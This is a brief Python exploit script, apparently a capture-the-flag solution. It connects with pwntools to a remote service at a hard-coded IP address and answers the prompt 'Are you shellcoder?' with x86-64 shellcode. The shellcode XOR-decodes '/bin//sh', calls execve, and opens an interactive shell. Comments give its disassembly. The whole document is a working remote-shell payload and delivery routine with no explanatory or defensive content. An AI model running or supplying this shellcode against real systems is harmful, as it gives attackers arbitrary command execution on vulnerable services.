from pwn import *

shellcode = '\x48\xb8\xaf\xe2\xe9\xee\xaf\xaf\xf3\xe8\x48\xbb\x80\x80\x80\x80\x80\x80\x80\x80\x48\x31\xd8\x99\x52\x50\x48\x89\xe7\x31\xf6\x8d\x42\x3b\x0f\x05'
# movabs $0xe8f3afafeee9e2af,%rax
# movabs $0x8080808080808080,%rbx
# xor %rbx,%rax
# cltd
# push   %rdx
# push   %rax
# mov    %rsp,%rdi
# xor    %esi,%esi
# lea    0x3b(%rdx),%eax
# syscall

r = remote('153.120.129.186', 20000)

r.sendlineafter('Are you shellcoder?\n', shellcode)

r.interactive()
